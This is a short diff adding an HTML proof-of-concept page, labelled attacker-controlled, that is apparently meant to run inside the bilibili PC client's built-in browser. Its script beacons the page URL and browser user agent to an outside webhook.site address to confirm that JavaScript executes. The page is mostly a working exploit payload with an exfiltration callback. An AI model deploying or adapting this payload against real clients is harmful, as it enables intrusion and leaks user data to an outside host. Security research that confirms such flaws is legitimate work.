@@ -1,0 +1,9 @@
+<!doctype html><title>PAGE-UNDER-ATTACKER-CONTROL</title>
+<body style="background:#ffeee0;font-family:Arial">
+<h1 style="color:#e04080">This page is attacker-controlled (bili-im-poc v9)</h1>
+<p>Loaded inside the bilibili PC client built-in browser. JS is running.</p>
+<script>
+function beacon(s){new Image().src='https://webhook.site/05fd1420-af5c-493b-8c5d-353f67b3f438?s='+encodeURIComponent(s)}
+beacon('v9-js-executed url='+location.href+' ua='+navigator.userAgent.slice(0,40));
+</script>
+</body>
